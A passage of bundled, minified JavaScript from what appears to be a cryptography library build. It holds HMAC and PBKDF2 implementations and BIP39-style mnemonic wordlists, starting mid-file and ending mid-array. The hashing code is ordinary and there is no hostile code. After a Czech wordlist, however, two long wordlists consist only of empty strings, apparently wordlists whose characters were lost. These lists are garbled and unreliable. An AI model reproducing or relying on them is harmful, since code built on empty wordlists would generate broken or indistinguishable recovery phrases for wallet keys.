    sha512$2.SHA512_256 = _.SHA512_256,
    sha512$2.sha512_256 = _.sha512_256,
    sha512$2
}
var pbkdf2 = {}, hmac$1 = {}, hasRequiredHmac$1;
function requireHmac$1() {
    return hasRequiredHmac$1 || (hasRequiredHmac$1 = 1,
    function(_) {
        Object.defineProperty(_, "__esModule", {
            value: !0
        }),
        _.hmac = _.HMAC = void 0;
        const M = requireUtils$8();
        class j extends M.Hash {
            constructor(w, b) {
                super(),
                this.finished = !1,
                this.destroyed = !1,
                (0,
                M.ahash)(w);
                const X = (0,
                M.toBytes)(b);
                if (this.iHash = w.create(),
                typeof this.iHash.update != "function")
                    throw new Error("Expected instance of class which extends utils.Hash");
                this.blockLen = this.iHash.blockLen,
                this.outputLen = this.iHash.outputLen;
                const Y = this.blockLen
                  , F = new Uint8Array(Y);
                F.set(X.length > Y ? w.create().update(X).digest() : X);
                for (let V = 0; V < F.length; V++)
                    F[V] ^= 54;
                this.iHash.update(F),
                this.oHash = w.create();
                for (let V = 0; V < F.length; V++)
                    F[V] ^= 106;
                this.oHash.update(F),
                (0,
                M.clean)(F)
            }
            update(w) {
                return (0,
                M.aexists)(this),
                this.iHash.update(w),
                this
            }
            digestInto(w) {
                (0,
                M.aexists)(this),
                (0,
                M.abytes)(w, this.outputLen),
                this.finished = !0,
                this.iHash.digestInto(w),
                this.oHash.update(w),
                this.oHash.digestInto(w),
                this.destroy()
            }
            digest() {
                const w = new Uint8Array(this.oHash.outputLen);
                return this.digestInto(w),
                w
            }
            _cloneInto(w) {
                w || (w = Object.create(Object.getPrototypeOf(this), {}));
                const {oHash: b, iHash: X, finished: Y, destroyed: F, blockLen: V, outputLen: K} = this;
                return w = w,
                w.finished = Y,
                w.destroyed = F,
                w.blockLen = V,
                w.outputLen = K,
                w.oHash = b._cloneInto(w.oHash),
                w.iHash = X._cloneInto(w.iHash),
                w
            }
            clone() {
                return this._cloneInto()
            }
            destroy() {
                this.destroyed = !0,
                this.oHash.destroy(),
                this.iHash.destroy()
            }
        }
        _.HMAC = j;
        const O = (x, w, b) => new j(x,w).update(b).digest();
        _.hmac = O,
        _.hmac.create = (x, w) => new j(x,w)
    }(hmac$1)),
    hmac$1
}
var hasRequiredPbkdf2;
function requirePbkdf2() {
    if (hasRequiredPbkdf2)
        return pbkdf2;
    hasRequiredPbkdf2 = 1,
    Object.defineProperty(pbkdf2, "__esModule", {
        value: !0
    }),
    pbkdf2.pbkdf2 = x,
    pbkdf2.pbkdf2Async = w;
    const _ = requireHmac$1()
      , M = requireUtils$8();
    function j(b, X, Y, F) {
        (0,
        M.ahash)(b);
        const V = (0,
        M.checkOpts)({
            dkLen: 32,
            asyncTick: 10
        }, F)
          , {c: K, dkLen: Q, asyncTick: ee} = V;
        if ((0,
        M.anumber)(K),
        (0,
        M.anumber)(Q),
        (0,
        M.anumber)(ee),
        K < 1)
            throw new Error("iterations (c) should be >= 1");
        const ae = (0,
        M.kdfInputToBytes)(X)
          , ne = (0,
        M.kdfInputToBytes)(Y)
          , oe = new Uint8Array(Q)
          , ue = _.hmac.create(b, ae)
          , fe = ue._cloneInto().update(ne);
        return {
            c: K,
            dkLen: Q,
            asyncTick: ee,
            DK: oe,
            PRF: ue,
            PRFSalt: fe
        }
    }
    function O(b, X, Y, F, V) {
        return b.destroy(),
        X.destroy(),
        F && F.destroy(),
        (0,
        M.clean)(V),
        Y
    }
    function x(b, X, Y, F) {
        const {c: V, dkLen: K, DK: Q, PRF: ee, PRFSalt: ae} = j(b, X, Y, F);
        let ne;
        const oe = new Uint8Array(4)
          , ue = (0,
        M.createView)(oe)
          , fe = new Uint8Array(ee.outputLen);
        for (let he = 1, pe = 0; pe < K; he++,
        pe += ee.outputLen) {
            const ye = Q.subarray(pe, pe + ee.outputLen);
            ue.setInt32(0, he, !1),
            (ne = ae._cloneInto(ne)).update(oe).digestInto(fe),
            ye.set(fe.subarray(0, ye.length));
            for (let be = 1; be < V; be++) {
                ee._cloneInto(ne).update(fe).digestInto(fe);
                for (let xe = 0; xe < ye.length; xe++)
                    ye[xe] ^= fe[xe]
            }
        }
        return O(ee, ae, Q, ne, fe)
    }
    async function w(b, X, Y, F) {
        const {c: V, dkLen: K, asyncTick: Q, DK: ee, PRF: ae, PRFSalt: ne} = j(b, X, Y, F);
        let oe;
        const ue = new Uint8Array(4)
          , fe = (0,
        M.createView)(ue)
          , he = new Uint8Array(ae.outputLen);
        for (let pe = 1, ye = 0; ye < K; pe++,
        ye += ae.outputLen) {
            const be = ee.subarray(ye, ye + ae.outputLen);
            fe.setInt32(0, pe, !1),
            (oe = ne._cloneInto(oe)).update(ue).digestInto(he),
            be.set(he.subarray(0, be.length)),
            await (0,
            M.asyncLoop)(V - 1, Q, () => {
                ae._cloneInto(oe).update(he).digestInto(he);
                for (let xe = 0; xe < be.length; xe++)
                    be[xe] ^= he[xe]
            }
            )
        }
        return O(ae, ne, ee, oe, he)
    }
    return pbkdf2
}
var _wordlists = {};
const require$$0$4 = JSON.parse('["abdikace","abeceda","adresa","agrese","akce","aktovka","alej","alkohol","amputace","ananas","andulka","anekdota","anketa","antika","anulovat","archa","arogance","asfalt","asistent","aspirace","astma","astronom","atlas","atletika","atol","autobus","azyl","babka","bachor","bacil","baculka","badatel","bageta","bagr","bahno","bakterie","balada","baletka","balkon","balonek","balvan","balza","bambus","bankomat","barbar","baret","barman","baroko","barva","baterka","batoh","bavlna","bazalka","bazilika","bazuka","bedna","beran","beseda","bestie","beton","bezinka","bezmoc","beztak","bicykl","bidlo","biftek","bikiny","bilance","biograf","biolog","bitva","bizon","blahobyt","blatouch","blecha","bledule","blesk","blikat","blizna","blokovat","bloudit","blud","bobek","bobr","bodlina","bodnout","bohatost","bojkot","bojovat","bokorys","bolest","borec","borovice","bota","boubel","bouchat","bouda","boule","bourat","boxer","bradavka","brambora","branka","bratr","brepta","briketa","brko","brloh","bronz","broskev","brunetka","brusinka","brzda","brzy","bublina","bubnovat","buchta","buditel","budka","budova","bufet","bujarost","bukvice","buldok","bulva","bunda","bunkr","burza","butik","buvol","buzola","bydlet","bylina","bytovka","bzukot","capart","carevna","cedr","cedule","cejch","cejn","cela","celer","celkem","celnice","cenina","cennost","cenovka","centrum","cenzor","cestopis","cetka","chalupa","chapadlo","charita","chata","chechtat","chemie","chichot","chirurg","chlad","chleba","chlubit","chmel","chmura","chobot","chochol","chodba","cholera","chomout","chopit","choroba","chov","chrapot","chrlit","chrt","chrup","chtivost","chudina","chutnat","chvat","chvilka","chvost","chyba","chystat","chytit","cibule","cigareta","cihelna","cihla","cinkot","cirkus","cisterna","citace","citrus","cizinec","cizost","clona","cokoliv","couvat","ctitel","ctnost","cudnost","cuketa","cukr","cupot","cvaknout","cval","cvik","cvrkot","cyklista","daleko","dareba","datel","datum","dcera","debata","dechovka","decibel","deficit","deflace","dekl","dekret","demokrat","deprese","derby","deska","detektiv","dikobraz","diktovat","dioda","diplom","disk","displej","divadlo","divoch","dlaha","dlouho","dluhopis","dnes","dobro","dobytek","docent","dochutit","dodnes","dohled","dohoda","dohra","dojem","dojnice","doklad","dokola","doktor","dokument","dolar","doleva","dolina","doma","dominant","domluvit","domov","donutit","dopad","dopis","doplnit","doposud","doprovod","dopustit","dorazit","dorost","dort","dosah","doslov","dostatek","dosud","dosyta","dotaz","dotek","dotknout","doufat","doutnat","dovozce","dozadu","doznat","dozorce","drahota","drak","dramatik","dravec","draze","drdol","drobnost","drogerie","drozd","drsnost","drtit","drzost","duben","duchovno","dudek","duha","duhovka","dusit","dusno","dutost","dvojice","dvorec","dynamit","ekolog","ekonomie","elektron","elipsa","email","emise","emoce","empatie","epizoda","epocha","epopej","epos","esej","esence","eskorta","eskymo","etiketa","euforie","evoluce","exekuce","exkurze","expedice","exploze","export","extrakt","facka","fajfka","fakulta","fanatik","fantazie","farmacie","favorit","fazole","federace","fejeton","fenka","fialka","figurant","filozof","filtr","finance","finta","fixace","fjord","flanel","flirt","flotila","fond","fosfor","fotbal","fotka","foton","frakce","freska","fronta","fukar","funkce","fyzika","galeje","garant","genetika","geolog","gilotina","glazura","glejt","golem","golfista","gotika","graf","gramofon","granule","grep","gril","grog","groteska","guma","hadice","hadr","hala","halenka","hanba","hanopis","harfa","harpuna","havran","hebkost","hejkal","hejno","hejtman","hektar","helma","hematom","herec","herna","heslo","hezky","historik","hladovka","hlasivky","hlava","hledat","hlen","hlodavec","hloh","hloupost","hltat","hlubina","hluchota","hmat","hmota","hmyz","hnis","hnojivo","hnout","hoblina","hoboj","hoch","hodiny","hodlat","hodnota","hodovat","hojnost","hokej","holinka","holka","holub","homole","honitba","honorace","horal","horda","horizont","horko","horlivec","hormon","hornina","horoskop","horstvo","hospoda","hostina","hotovost","houba","houf","houpat","houska","hovor","hradba","hranice","hravost","hrazda","hrbolek","hrdina","hrdlo","hrdost","hrnek","hrobka","hromada","hrot","hrouda","hrozen","hrstka","hrubost","hryzat","hubenost","hubnout","hudba","hukot","humr","husita","hustota","hvozd","hybnost","hydrant","hygiena","hymna","hysterik","idylka","ihned","ikona","iluze","imunita","infekce","inflace","inkaso","inovace","inspekce","internet","invalida","investor","inzerce","ironie","jablko","jachta","jahoda","jakmile","jakost","jalovec","jantar","jarmark","jaro","jasan","jasno","jatka","javor","jazyk","jedinec","jedle","jednatel","jehlan","jekot","jelen","jelito","jemnost","jenom","jepice","jeseter","jevit","jezdec","jezero","jinak","jindy","jinoch","jiskra","jistota","jitrnice","jizva","jmenovat","jogurt","jurta","kabaret","kabel","kabinet","kachna","kadet","kadidlo","kahan","kajak","kajuta","kakao","kaktus","kalamita","kalhoty","kalibr","kalnost","kamera","kamkoliv","kamna","kanibal","kanoe","kantor","kapalina","kapela","kapitola","kapka","kaple","kapota","kapr","kapusta","kapybara","karamel","karotka","karton","kasa","katalog","katedra","kauce","kauza","kavalec","kazajka","kazeta","kazivost","kdekoliv","kdesi","kedluben","kemp","keramika","kino","klacek","kladivo","klam","klapot","klasika","klaun","klec","klenba","klepat","klesnout","klid","klima","klisna","klobouk","klokan","klopa","kloub","klubovna","klusat","kluzkost","kmen","kmitat","kmotr","kniha","knot","koalice","koberec","kobka","kobliha","kobyla","kocour","kohout","kojenec","kokos","koktejl","kolaps","koleda","kolize","kolo","komando","kometa","komik","komnata","komora","kompas","komunita","konat","koncept","kondice","konec","konfese","kongres","konina","konkurs","kontakt","konzerva","kopanec","kopie","kopnout","koprovka","korbel","korektor","kormidlo","koroptev","korpus","koruna","koryto","korzet","kosatec","kostka","kotel","kotleta","kotoul","koukat","koupelna","kousek","kouzlo","kovboj","koza","kozoroh","krabice","krach","krajina","kralovat","krasopis","kravata","kredit","krejcar","kresba","kreveta","kriket","kritik","krize","krkavec","krmelec","krmivo","krocan","krok","kronika","kropit","kroupa","krovka","krtek","kruhadlo","krupice","krutost","krvinka","krychle","krypta","krystal","kryt","kudlanka","kufr","kujnost","kukla","kulajda","kulich","kulka","kulomet","kultura","kuna","kupodivu","kurt","kurzor","kutil","kvalita","kvasinka","kvestor","kynolog","kyselina","kytara","kytice","kytka","kytovec","kyvadlo","labrador","lachtan","ladnost","laik","lakomec","lamela","lampa","lanovka","lasice","laso","lastura","latinka","lavina","lebka","leckdy","leden","lednice","ledovka","ledvina","legenda","legie","legrace","lehce","lehkost","lehnout","lektvar","lenochod","lentilka","lepenka","lepidlo","letadlo","letec","letmo","letokruh","levhart","levitace","levobok","libra","lichotka","lidojed","lidskost","lihovina","lijavec","lilek","limetka","linie","linka","linoleum","listopad","litina","litovat","lobista","lodivod","logika","logoped","lokalita","loket","lomcovat","lopata","lopuch","lord","losos","lotr","loudal","louh","louka","louskat","lovec","lstivost","lucerna","lucifer","lump","lusk","lustrace","lvice","lyra","lyrika","lysina","madam","madlo","magistr","mahagon","majetek","majitel","majorita","makak","makovice","makrela","malba","malina","malovat","malvice","maminka","mandle","manko","marnost","masakr","maskot","masopust","matice","matrika","maturita","mazanec","mazivo","mazlit","mazurka","mdloba","mechanik","meditace","medovina","melasa","meloun","mentolka","metla","metoda","metr","mezera","migrace","mihnout","mihule","mikina","mikrofon","milenec","milimetr","milost","mimika","mincovna","minibar","minomet","minulost","miska","mistr","mixovat","mladost","mlha","mlhovina","mlok","mlsat","mluvit","mnich","mnohem","mobil","mocnost","modelka","modlitba","mohyla","mokro","molekula","momentka","monarcha","monokl","monstrum","montovat","monzun","mosaz","moskyt","most","motivace","motorka","motyka","moucha","moudrost","mozaika","mozek","mozol","mramor","mravenec","mrkev","mrtvola","mrzet","mrzutost","mstitel","mudrc","muflon","mulat","mumie","munice","muset","mutace","muzeum","muzikant","myslivec","mzda","nabourat","nachytat","nadace","nadbytek","nadhoz","nadobro","nadpis","nahlas","nahnat","nahodile","nahradit","naivita","najednou","najisto","najmout","naklonit","nakonec","nakrmit","nalevo","namazat","namluvit","nanometr","naoko","naopak","naostro","napadat","napevno","naplnit","napnout","naposled","naprosto","narodit","naruby","narychlo","nasadit","nasekat","naslepo","nastat","natolik","navenek","navrch","navzdory","nazvat","nebe","nechat","necky","nedaleko","nedbat","neduh","negace","nehet","nehoda","nejen","nejprve","neklid","nelibost","nemilost","nemoc","neochota","neonka","nepokoj","nerost","nerv","nesmysl","nesoulad","netvor","neuron","nevina","nezvykle","nicota","nijak","nikam","nikdy","nikl","nikterak","nitro","nocleh","nohavice","nominace","nora","norek","nositel","nosnost","nouze","noviny","novota","nozdra","nuda","nudle","nuget","nutit","nutnost","nutrie","nymfa","obal","obarvit","obava","obdiv","obec","obehnat","obejmout","obezita","obhajoba","obilnice","objasnit","objekt","obklopit","oblast","oblek","obliba","obloha","obluda","obnos","obohatit","obojek","obout","obrazec","obrna","obruba","obrys","obsah","obsluha","obstarat","obuv","obvaz","obvinit","obvod","obvykle","obyvatel","obzor","ocas","ocel","ocenit","ochladit","ochota","ochrana","ocitnout","odboj","odbyt","odchod","odcizit","odebrat","odeslat","odevzdat","odezva","odhadce","odhodit","odjet","odjinud","odkaz","odkoupit","odliv","odluka","odmlka","odolnost","odpad","odpis","odplout","odpor","odpustit","odpykat","odrazka","odsoudit","odstup","odsun","odtok","odtud","odvaha","odveta","odvolat","odvracet","odznak","ofina","ofsajd","ohlas","ohnisko","ohrada","ohrozit","ohryzek","okap","okenice","oklika","okno","okouzlit","okovy","okrasa","okres","okrsek","okruh","okupant","okurka","okusit","olejnina","olizovat","omak","omeleta","omezit","omladina","omlouvat","omluva","omyl","onehdy","opakovat","opasek","operace","opice","opilost","opisovat","opora","opozice","opravdu","oproti","orbital","orchestr","orgie","orlice","orloj","ortel","osada","oschnout","osika","osivo","oslava","oslepit","oslnit","oslovit","osnova","osoba","osolit","ospalec","osten","ostraha","ostuda","ostych","osvojit","oteplit","otisk","otop","otrhat","otrlost","otrok","otruby","otvor","ovanout","ovar","oves","ovlivnit","ovoce","oxid","ozdoba","pachatel","pacient","padouch","pahorek","pakt","palanda","palec","palivo","paluba","pamflet","pamlsek","panenka","panika","panna","panovat","panstvo","pantofle","paprika","parketa","parodie","parta","paruka","paryba","paseka","pasivita","pastelka","patent","patrona","pavouk","pazneht","pazourek","pecka","pedagog","pejsek","peklo","peloton","penalta","pendrek","penze","periskop","pero","pestrost","petarda","petice","petrolej","pevnina","pexeso","pianista","piha","pijavice","pikle","piknik","pilina","pilnost","pilulka","pinzeta","pipeta","pisatel","pistole","pitevna","pivnice","pivovar","placenta","plakat","plamen","planeta","plastika","platit","plavidlo","plaz","plech","plemeno","plenta","ples","pletivo","plevel","plivat","plnit","plno","plocha","plodina","plomba","plout","pluk","plyn","pobavit","pobyt","pochod","pocit","poctivec","podat","podcenit","podepsat","podhled","podivit","podklad","podmanit","podnik","podoba","podpora","podraz","podstata","podvod","podzim","poezie","pohanka","pohnutka","pohovor","pohroma","pohyb","pointa","pojistka","pojmout","pokazit","pokles","pokoj","pokrok","pokuta","pokyn","poledne","polibek","polknout","poloha","polynom","pomalu","pominout","pomlka","pomoc","pomsta","pomyslet","ponechat","ponorka","ponurost","popadat","popel","popisek","poplach","poprosit","popsat","popud","poradce","porce","porod","porucha","poryv","posadit","posed","posila","poskok","poslanec","posoudit","pospolu","postava","posudek","posyp","potah","potkan","potlesk","potomek","potrava","potupa","potvora","poukaz","pouto","pouzdro","povaha","povidla","povlak","povoz","povrch","povstat","povyk","povzdech","pozdrav","pozemek","poznatek","pozor","pozvat","pracovat","prahory","praktika","prales","praotec","praporek","prase","pravda","princip","prkno","probudit","procento","prodej","profese","prohra","projekt","prolomit","promile","pronikat","propad","prorok","prosba","proton","proutek","provaz","prskavka","prsten","prudkost","prut","prvek","prvohory","psanec","psovod","pstruh","ptactvo","puberta","puch","pudl","pukavec","puklina","pukrle","pult","pumpa","punc","pupen","pusa","pusinka","pustina","putovat","putyka","pyramida","pysk","pytel","racek","rachot","radiace","radnice","radon","raft","ragby","raketa","rakovina","rameno","rampouch","rande","rarach","rarita","rasovna","rastr","ratolest","razance","razidlo","reagovat","reakce","recept","redaktor","referent","reflex","rejnok","reklama","rekord","rekrut","rektor","reputace","revize","revma","revolver","rezerva","riskovat","riziko","robotika","rodokmen","rohovka","rokle","rokoko","romaneto","ropovod","ropucha","rorejs","rosol","rostlina","rotmistr","rotoped","rotunda","roubenka","roucho","roup","roura","rovina","rovnice","rozbor","rozchod","rozdat","rozeznat","rozhodce","rozinka","rozjezd","rozkaz","rozloha","rozmar","rozpad","rozruch","rozsah","roztok","rozum","rozvod","rubrika","ruchadlo","rukavice","rukopis","ryba","rybolov","rychlost","rydlo","rypadlo","rytina","ryzost","sadista","sahat","sako","samec","samizdat","samota","sanitka","sardinka","sasanka","satelit","sazba","sazenice","sbor","schovat","sebranka","secese","sedadlo","sediment","sedlo","sehnat","sejmout","sekera","sekta","sekunda","sekvoje","semeno","seno","servis","sesadit","seshora","seskok","seslat","sestra","sesuv","sesypat","setba","setina","setkat","setnout","setrvat","sever","seznam","shoda","shrnout","sifon","silnice","sirka","sirotek","sirup","situace","skafandr","skalisko","skanzen","skaut","skeptik","skica","skladba","sklenice","sklo","skluz","skoba","skokan","skoro","skripta","skrz","skupina","skvost","skvrna","slabika","sladidlo","slanina","slast","slavnost","sledovat","slepec","sleva","slezina","slib","slina","sliznice","slon","sloupek","slovo","sluch","sluha","slunce","slupka","slza","smaragd","smetana","smilstvo","smlouva","smog","smrad","smrk","smrtka","smutek","smysl","snad","snaha","snob","sobota","socha","sodovka","sokol","sopka","sotva","souboj","soucit","soudce","souhlas","soulad","soumrak","souprava","soused","soutok","souviset","spalovna","spasitel","spis","splav","spodek","spojenec","spolu","sponzor","spornost","spousta","sprcha","spustit","sranda","sraz","srdce","srna","srnec","srovnat","srpen","srst","srub","stanice","starosta","statika","stavba","stehno","stezka","stodola","stolek","stopa","storno","stoupat","strach","stres","strhnout","strom","struna","studna","stupnice","stvol","styk","subjekt","subtropy","suchar","sudost","sukno","sundat","sunout","surikata","surovina","svah","svalstvo","svetr","svatba","svazek","svisle","svitek","svoboda","svodidlo","svorka","svrab","sykavka","sykot","synek","synovec","sypat","sypkost","syrovost","sysel","sytost","tabletka","tabule","tahoun","tajemno","tajfun","tajga","tajit","tajnost","taktika","tamhle","tampon","tancovat","tanec","tanker","tapeta","tavenina","tazatel","technika","tehdy","tekutina","telefon","temnota","tendence","tenista","tenor","teplota","tepna","teprve","terapie","termoska","textil","ticho","tiskopis","titulek","tkadlec","tkanina","tlapka","tleskat","tlukot","tlupa","tmel","toaleta","topinka","topol","torzo","touha","toulec","tradice","traktor","tramp","trasa","traverza","trefit","trest","trezor","trhavina","trhlina","trochu","trojice","troska","trouba","trpce","trpitel","trpkost","trubec","truchlit","truhlice","trus","trvat","tudy","tuhnout","tuhost","tundra","turista","turnaj","tuzemsko","tvaroh","tvorba","tvrdost","tvrz","tygr","tykev","ubohost","uboze","ubrat","ubrousek","ubrus","ubytovna","ucho","uctivost","udivit","uhradit","ujednat","ujistit","ujmout","ukazatel","uklidnit","uklonit","ukotvit","ukrojit","ulice","ulita","ulovit","umyvadlo","unavit","uniforma","uniknout","upadnout","uplatnit","uplynout","upoutat","upravit","uran","urazit","usednout","usilovat","usmrtit","usnadnit","usnout","usoudit","ustlat","ustrnout","utahovat","utkat","utlumit","utonout","utopenec","utrousit","uvalit","uvolnit","uvozovka","uzdravit","uzel","uzenina","uzlina","uznat","vagon","valcha","valoun","vana","vandal","vanilka","varan","varhany","varovat","vcelku","vchod","vdova","vedro","vegetace","vejce","velbloud","veletrh","velitel","velmoc","velryba","venkov","veranda","verze","veselka","veskrze","vesnice","vespodu","vesta","veterina","veverka","vibrace","vichr","videohra","vidina","vidle","vila","vinice","viset","vitalita","vize","vizitka","vjezd","vklad","vkus","vlajka","vlak","vlasec","vlevo","vlhkost","vliv","vlnovka","vloupat","vnucovat","vnuk","voda","vodivost","vodoznak","vodstvo","vojensky","vojna","vojsko","volant","volba","volit","volno","voskovka","vozidlo","vozovna","vpravo","vrabec","vracet","vrah","vrata","vrba","vrcholek","vrhat","vrstva","vrtule","vsadit","vstoupit","vstup","vtip","vybavit","vybrat","vychovat","vydat","vydra","vyfotit","vyhledat","vyhnout","vyhodit","vyhradit","vyhubit","vyjasnit","vyjet","vyjmout","vyklopit","vykonat","vylekat","vymazat","vymezit","vymizet","vymyslet","vynechat","vynikat","vynutit","vypadat","vyplatit","vypravit","vypustit","vyrazit","vyrovnat","vyrvat","vyslovit","vysoko","vystavit","vysunout","vysypat","vytasit","vytesat","vytratit","vyvinout","vyvolat","vyvrhel","vyzdobit","vyznat","vzadu","vzbudit","vzchopit","vzdor","vzduch","vzdychat","vzestup","vzhledem","vzkaz","vzlykat","vznik","vzorek","vzpoura","vztah","vztek","xylofon","zabrat","zabydlet","zachovat","zadarmo","zadusit","zafoukat","zahltit","zahodit","zahrada","zahynout","zajatec","zajet","zajistit","zaklepat","zakoupit","zalepit","zamezit","zamotat","zamyslet","zanechat","zanikat","zaplatit","zapojit","zapsat","zarazit","zastavit","zasunout","zatajit","zatemnit","zatknout","zaujmout","zavalit","zavelet","zavinit","zavolat","zavrtat","zazvonit","zbavit","zbrusu","zbudovat","zbytek","zdaleka","zdarma","zdatnost","zdivo","zdobit","zdroj","zdvih","zdymadlo","zelenina","zeman","zemina","zeptat","zezadu","zezdola","zhatit","zhltnout","zhluboka","zhotovit","zhruba","zima","zimnice","zjemnit","zklamat","zkoumat","zkratka","zkumavka","zlato","zlehka","zloba","zlom","zlost","zlozvyk","zmapovat","zmar","zmatek","zmije","zmizet","zmocnit","zmodrat","zmrzlina","zmutovat","znak","znalost","znamenat","znovu","zobrazit","zotavit","zoubek","zoufale","zplodit","zpomalit","zprava","zprostit","zprudka","zprvu","zrada","zranit","zrcadlo","zrnitost","zrno","zrovna","zrychlit","zrzavost","zticha","ztratit","zubovina","zubr","zvednout","zvenku","zvesela","zvon","zvrat","zvukovod","zvyk"]')
  , require$$1$5 = JSON.parse('["","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","",""]')
  , require$$2$2 = JSON.parse('["","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","